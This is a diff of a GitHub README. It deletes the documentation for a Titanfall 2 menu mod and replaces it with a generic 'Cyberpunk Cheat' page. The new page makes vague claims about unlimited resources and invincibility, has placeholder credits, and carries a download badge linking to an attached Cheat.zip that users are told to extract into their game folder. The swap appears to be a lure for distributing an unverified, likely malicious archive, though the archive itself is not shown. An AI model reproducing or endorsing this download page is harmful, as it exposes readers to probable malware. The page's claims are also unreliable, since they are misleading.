@@ -1,120 +1,65 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Cyberpunk Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+![Cyberpunk Cheat Banner](https://example.com/cyberpunk_banner.png)
 
+Welcome to the Cyberpunk Cheat repository! This repository contains a collection of cheats and hacks for enhancing your gameplay experience in the Cyberpunk universe. Whether you're looking to unlock special abilities, access hidden features, or simply have some fun breaking the game's mechanics, you've come to the right place.
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Features
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+🕹️ **Game Enhancements**: Discover various cheats to modify the game mechanics and make your gameplay more interesting.
+
+🚀 **Unlock Special Abilities**: Gain access to powerful abilities and features that are usually locked in the game.
+
+🔒 **Unlock Hidden Features**: Uncover hidden features and content that are not readily available during standard gameplay.
+
+🤖 **AI Manipulation**: Experiment with cheats that manipulate the game's AI behavior and interactions.
+
+🔧 **Customization Options**: Customize your gaming experience by utilizing the cheats provided in this repository.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To install the Cyberpunk Cheat collection, follow these steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Download the cheat file by clicking on the button below:
+   
+   [![Download Cyberpunk Cheat](https://img.shields.io/badge/Download-Cyberpunk_Cheat-blueviolet)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-## Icepick
+2. Extract the contents of the downloaded file to your Cyberpunk game directory.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+3. Launch the game and start exploring the new possibilities enabled by the cheats.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+## Usage
 
-3) Launch Icepick.
+- **Unlimited Resources**: Acquire unlimited in-game currency to purchase all the items you desire.
+- **Invincibility Mode**: Activate invincibility mode to become unstoppable against enemies.
+- **Instant Level Up**: Boost your character's level instantly to access higher skills and abilities.
+- **Unlock All Content**: Gain access to all locked content and features without completing specific in-game requirements.
 
-## Northstar
+## Contribute
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+Contributions to the Cyberpunk Cheat repository are always welcome! If you have discovered new cheats, hacks, or enhancements for the game, feel free to submit a pull request with your changes.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+### Guidelines for Contributions
 
-3) Launch Northstar.
+To ensure consistency and quality within the cheat collection, please adhere to the following guidelines when contributing:
 
-## Screenshots
+1. Clearly describe the cheat or hack being added.
+2. Provide instructions on how to use the cheat in the game.
+3. Test the cheat thoroughly to confirm its functionality and safety.
+4. Avoid submitting cheats that may harm or disrupt the gaming experience for other players.
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## Credits
 
-Main Menu with the original Titanfall 2 menu video
+👨‍💻 Developed by: [Your Name](https://github.com/your-profile)
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+📷 Images sourced from: [Unsplash](https://unsplash.com/) and [Pixabay](https://pixabay.com/)
 
-Main Menu with the showcase removed to declutter the menu
+🎨 Banner Art by: [Artist Name](https://www.artstation.com/artist-profile)
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## License
 
-New Cheat options that can be enabled as well as the extras menu
+This cheat collection is available under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and share these cheats as per the terms of the license.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+---
 
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Happy Cheating in the Cyberpunk Universe! 🎮✨
